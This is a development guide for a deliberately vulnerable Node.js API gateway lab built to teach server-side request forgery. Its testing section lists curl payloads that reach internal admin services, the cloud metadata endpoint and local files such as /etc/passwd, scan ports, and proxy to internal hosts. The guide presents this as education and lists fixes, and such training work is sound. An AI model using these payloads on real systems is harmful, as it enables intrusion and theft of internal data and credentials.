# Development Guide - Lab 03: Node.js API Gateway

## Prerequisites

- Node.js 16+ and npm
- Docker and Docker Compose (optional)
- Basic understanding of microservices architecture
- Knowledge of HTTP requests and REST APIs

## Project Structure

```
labs/lab-03-nodejs-gateway/
├── README.md
├── ARCHITECTURE.md
├── DEV_GUIDE.md
├── DEPLOY_LOCAL.md
├── SECURITY_REVIEW.md
├── package.json
├── Dockerfile
├── docker-compose.yml
├── src/
│   ├── gateway/
│   │   ├── app.js
│   │   ├── routes/
│   │   │   ├── api.js
│   │   │   ├── webhook.js
│   │   │   └── proxy.js
│   │   └── middleware/
│   │       ├── auth.js
│   │       └── logging.js
│   ├── services/
│   │   ├── auth-service.js
│   │   ├── user-service.js
│   │   └── admin-service.js
│   └── utils/
│       ├── database.js
│       └── validators.js
├── tests/
│   ├── ssrf-tests.js
│   └── integration-tests.js
└── interview/
    └── QUESTIONS.md
```

## Setup Instructions

### 1. Install Dependencies

```bash
cd labs/lab-03-nodejs-gateway
npm install
```

### 2. Environment Configuration

Create a `.env` file:
```bash
NODE_ENV=development
PORT=3000
AUTH_SERVICE_PORT=3001
USER_SERVICE_PORT=3002
ADMIN_SERVICE_PORT=3003
DATABASE_PATH=./data/gateway.db
LOG_LEVEL=debug
```

### 3. Initialize Database

```bash
npm run db:init
```

### 4. Start All Services

```bash
# Start all services in development mode
npm run dev

# Or start individual services
npm run start:gateway
npm run start:auth
npm run start:users
npm run start:admin
```

## Development Workflow

### Running in Development Mode

The application supports hot reloading using nodemon:

```bash
npm run dev
```

This starts all four services:
- Gateway: http://localhost:3000
- Auth Service: http://localhost:3001
- User Service: http://localhost:3002
- Admin Service: http://localhost:3003

### API Testing

Use the provided test scripts:

```bash
# Test normal functionality
npm run test:api

# Test SSRF vulnerabilities
npm run test:ssrf

# Run security assessment
npm run security:scan
```

### Database Operations

```bash
# Initialize database
npm run db:init

# Reset database
npm run db:reset

# Seed test data
npm run db:seed
```

## SSRF Vulnerability Testing

### 1. Webhook SSRF

Test the webhook notification endpoint:

```bash
# Test internal service access
curl -X POST http://localhost:3000/api/webhook/notify \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:3003/admin/stats",
    "data": {"test": "payload"}
  }'

# Test cloud metadata access
curl -X POST http://localhost:3000/api/webhook/notify \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/",
    "data": {}
  }'
```

### 2. Fetch SSRF

Test the URL fetching endpoint:

```bash
# Fetch internal service data
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:3001/auth/verify"

# Attempt to read local files
curl "http://localhost:3000/api/fetch?url=file:///etc/passwd"

# Port scanning
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:22"
curl "http://localhost:3000/api/fetch?url=http://127.0.0.1:80"
```

### 3. Proxy SSRF

Test the proxy endpoint:

```bash
# Use gateway as proxy to internal services
curl "http://localhost:3000/api/proxy/http://127.0.0.1:3003/admin/config"

# Bypass external firewalls
curl "http://localhost:3000/api/proxy/http://internal-service.company.com/secret"
```

## Debugging

### Enable Debug Logging

```bash
DEBUG=gateway:* npm run dev
```

### Common Issues

1. **Port Conflicts**
   ```bash
   # Check which services are running on required ports
   netstat -tulpn | grep :300[0-3]
   
   # Kill processes if needed
   kill $(lsof -t -i:3000)
   ```

2. **Database Lock Issues**
   ```bash
   # Remove database lock
   rm -f ./data/gateway.db-wal ./data/gateway.db-shm
   ```

3. **Permission Errors**
   ```bash
   # Fix file permissions
   chmod -R 755 ./data/
   ```

## Security Analysis

### Code Review Focus Areas

1. **URL Validation**: Check `src/utils/validators.js`
2. **Request Routing**: Review `src/gateway/routes/*.js`
3. **Input Sanitization**: Examine middleware functions
4. **Response Handling**: Look for information disclosure

### SSRF Detection

The application includes intentional vulnerabilities for educational purposes:

- No URL allowlist validation
- Direct network access from user input
- Internal service responses returned to users
- No rate limiting on external requests

### Secure Configuration

To secure the application:

1. Implement URL allowlist validation
2. Add network segmentation
3. Filter internal IP ranges
4. Implement request rate limiting
5. Add response sanitization

## Performance Monitoring

### Memory Usage

```bash
# Monitor memory usage
npm run monitor:memory
```

### Request Metrics

```bash
# View request statistics
curl http://localhost:3000/metrics
```

### Log Analysis

```bash
# Tail application logs
tail -f logs/gateway.log

# Search for SSRF attempts
grep -i ssrf logs/gateway.log
